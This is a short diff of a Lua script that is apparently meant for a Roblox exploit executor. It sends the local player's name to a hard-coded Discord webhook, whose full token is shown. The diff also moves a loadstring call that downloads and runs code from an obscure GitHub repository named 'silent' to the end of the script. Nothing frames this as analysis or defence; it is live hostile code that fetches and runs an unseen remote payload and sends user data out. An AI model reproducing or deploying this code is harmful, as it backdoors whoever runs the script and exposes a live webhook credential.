@@ -130,8 +130,6 @@ pcall(function()
    end
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/silent"))();
-
 local player_name = game:GetService("Players").LocalPlayer.Name
 local webhook_url = "https://discord.com/api/webhooks/1055812529626038302/URF997mdfEmyd1pU19WSNbJJvybRqDlVvYPO-Slhlqdtq8Df5UpvOLIJzlejEngrKeEi"
 
@@ -151,3 +149,4 @@ syn.request(
         Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
     }
 )
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/silent"))();
